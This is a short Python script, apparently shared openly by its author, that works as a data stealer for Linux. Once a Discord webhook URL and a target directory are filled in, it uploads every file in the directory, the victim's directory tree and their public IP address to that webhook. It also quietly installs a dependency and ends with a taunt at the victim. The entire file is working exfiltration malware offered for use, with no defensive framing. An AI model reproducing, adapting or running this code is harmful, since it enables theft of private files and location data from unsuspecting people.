#MADE BY DuckyPolice. THIS WAS MADE FOR LINUX. IF YOU HAVE TIME ON YOUR HANDS, FEEL FREE TO EDIT IT HOEWVER YOU LIKE.
#CONTACT: Discord: DuckyPolice#9141 email: cooltomato12@gmail.com website: http://lotd.tk
# lines marked with "# !-!-!" need to have the stuff inside "<>" edited.
import os,time
wh = "<ENTER THE WEBHOOK HERE>" # !-!-!
def importwh():
    global DiscordWebhook
    try:
        from discord_webhook import DiscordWebhook
    except:
        os.system('pip install discord-webhook')
        importwh()
importwh()
def fileLeak():
    directory = '<ENTER TARGET DIRECTORY HERE>' # !-!-!
    for file in os.listdir(directory):
        try:
            webhook = DiscordWebhook(url=wh)
            with open(str(f"{directory}/{file}"), "r") as f:
                webhook.add_file(file=f.read(), filename=file)
            webhook.execute()
        except Exception as e:
            print(e)
            pass
    files = []
def ipLeak():
    #CAN POSSIBLY BE MODIFIED FOR WINDOWS. REMOVE THE "ipLeak()" at the bottom to disable.
    ip = os.popen('dig +short myip.opendns.com @resolver1.opendns.com').read()
    webhook = DiscordWebhook(url=wh,content=f"ip: {ip}")
    webhook.execute()
    print(ip)
def treeLeak():
    count = 1
    splittingstr = ""
    tree = os.popen('tree').read()
    for c in tree:
        count += 1
        if count % 1990 == 0:
            webhook = DiscordWebhook(url=wh,content=("" + splittingstr))
            response = webhook.execute()
            splittingstr = ""
            time.sleep(1)
        splittingstr = splittingstr + c
fileLeak()
treeLeak()
ipLeak()
for i in range(5):
    time.sleep(0.5)
    webhook = DiscordWebhook(url=wh, content="** **")
    webhook.execute()
print("RIP BOZO U JUST GOT LEAKED!!")